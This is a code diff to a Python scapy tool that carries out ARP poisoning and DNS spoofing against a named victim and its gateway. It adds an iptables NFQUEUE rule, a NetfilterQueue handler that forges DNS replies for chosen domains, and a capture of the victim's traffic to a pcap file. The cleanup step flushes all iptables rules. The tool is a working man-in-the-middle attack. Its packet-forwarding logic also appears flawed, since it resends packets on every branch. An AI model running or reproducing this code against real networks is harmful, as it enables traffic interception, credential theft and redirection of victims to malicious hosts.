@@ -1,7 +1,8 @@
 # Packages
 import scapy.all as scapy
 import sys, time, multiprocessing
-import netifaces as ni
+from netfilterqueue import NetfilterQueue
+import os
 
 # Constants
 DIVIDER = '=' * 60
@@ -70,11 +71,16 @@ class ARPDNSSpoofing():
                             pdst = self.gatewayIP,
                             hwdst = self.gatewayMac)
 
-        # Sniffing process
-        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)
+        # Prepare 
+        self.setupIPTable()
 
-        # Start sniffing process
+        # Initializing subprocesses
+        sniffingIncomingPacketsProcess = multiprocessing.Process(target = self.sniffIncomingPackets)
+        spoofingIncomingPacketsProcess = multiprocessing.Process(target = self.spoofIncomingPackets)
+
+        # Start processes
         sniffingIncomingPacketsProcess.start()
+        spoofingIncomingPacketsProcess.start()
 
         # Infinitely poisons the victims
         while True:
@@ -83,60 +89,87 @@ class ARPDNSSpoofing():
                 scapy.send(gatewayPoisonPacket)
                 time.sleep(POISON_BREAK)
             except KeyboardInterrupt: # CTRL-C was pressed
+                spoofingIncomingPacketsProcess.join() # Wait for the spoofing to stop
                 sniffingIncomingPacketsProcess.join() # Wait for the packet sniffing to stop
-                self.clean() # Cleaning ARP tables of the victims
+                self.clean() # Cleaning ARP tables of the victims and IP table
                 break # Stop the poisoning-loop
+
+    def setupIPTable(self):
+        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
 
     # Sniffs incoming packets
     def sniffIncomingPackets(self):
         bpfFilter = 'ip host {}'.format(self.victimIP) 
-        incomingPackets = scapy.sniff(filter = bpfFilter, prn = self.dnsSpoof)
-        #storing all packets in a pcap file
+        incomingPackets = scapy.sniff(filter = bpfFilter)
         scapy.wrpcap('captured_packets.pcap', incomingPackets)
 
-    # DNS spoof packets
-    def dnsSpoof(self, packet):
-        if packet.haslayer(scapy.IP) and packet.haslayer(scapy.DNSQR):
-            source_dest = packet[scapy.IP].src
-            if source_dest == self.victimIP and packet[scapy.DNSQR].qname in self.dnsDictionary:
-                if packet.haslayer(scapy.DNS):
-                    # Construct a new packet
-                    new_packet = scapy.Ether(src=packet[scapy.Ether].dst, dst=packet[scapy.Ether].src) / \
-                                scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
-                                scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
-                                scapy.DNS(id=packet[scapy.DNS].id, qd=packet[scapy.DNS].qd, aa=1, qr=1,
-                                        an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, type='A', ttl=624,
-                                                        rdata=self.dnsDictionary[packet[scapy.DNSQR].qname]))
+    # Spoof incoming packets
+    def spoofIncomingPackets(self):
+        netfilterQueue = NetfilterQueue()
+        
+        try:
+            netfilterQueue.bind(0, self.filterPackets)
+            netfilterQueue.run()
+        except KeyboardInterrupt:
+            return
 
-                    scapy.sendp(new_packet, iface=self.interface)
-                    print("DNS packet was sent with: " + new_packet.summary() + " to ip: " + new_packet[scapy.IP].dst)
-                else:
-                    if packet.haslayer(scapy.IP):
-                        del packet[scapy.IP].len
-                        del packet[scapy.IP].chksum
+    def translatePacket(self, packet):
+        rawPacket = packet.get_payload()
 
-                    if packet.haslayer(scapy.UDP):
-                        del packet[scapy.UDP].len
-                        del packet[scapy.UDP].chksum
+        return scapy.IP(rawPacket)
 
-                    scapy.send(packet)
+    # Filter packets
+    def filterPackets(self, packet):
+        packet = self.translatePacket(packet)
+
+        if packet.haslayer(scapy.DNS):
+            packetDNSLayer = packet.getlayer(scapy.DNS)
+            requestedDomain = packetDNSLayer.qd.qname
+            isTargetedDomain = requestedDomain in self.dnsDictionary
+            isDNSRequest = packetDNSLayer.qr == 0
+            if isTargetedDomain and isDNSRequest:
+                print("The spoofed domain ({}) was requested".format(requestedDomain))
+                # Original packet layers
+                packetIPLayer = packet.getlayer(scapy.IP)
+                packetUDPLayer = packet.getlayer(scapy.UDP)
+                
+                # Spoofed packet layers
+                spoofedIPLayer = scapy.IP(dst = packetIPLayer.src,
+                                src = packetIPLayer.dst) # Reverse IP sending direction
+                spoofedUDPLayer = scapy.UDP(dport = packetUDPLayer.sport,
+                                sport = packetUDPLayer.dport) # Reverse UDP sending direction
+                spoofedDNSLayer = scapy.DNS(id = packetDNSLayer.id,
+                                qr = 1,
+                                aa = 1,
+                                qd = packetDNSLayer.qd,
+                                an = scapy.DNSRR(rrname = requestedDomain,
+                                                ttl = 10,
+                                                rdata = self.dnsDictionary.get(requestedDomain)))
+
+                packet = spoofedIPLayer/spoofedUDPLayer/spoofedDNSLayer # Assemble and assign spoofed packet
+                scapy.send(packet)
+            else:
+                scapy.sendp(packet)
+        scapy.sendp(packet)
 
     # Clean ARP tables of the victims
     def clean(self):
-        # Clean victim one's ARP Table
+        # Clean the victim's ARP Table
         scapy.send(scapy.ARP(
             op=2,
             psrc=self.gatewayIP,
             hwsrc=self.gatewayMac,
             pdst=self.victimIP,
             hwdst="ff:ff:ff:ff:ff:ff"), count=5)
-        # Clean victim two's ARP Table
+        # Clean gateway's ARP Table
         scapy.send(scapy.ARP(
             op=2,
             psrc=self.victimIP,
             hwsrc=self.victimMac,
             pdst=self.gatewayIP,
             hwdst="ff:ff:ff:ff:ff:ff"), count=5)
+        # Clean IP table
+        os.system("iptables --flush")
 
     #check if the posioning was sucessful
     def check_arp_poisoning(self):
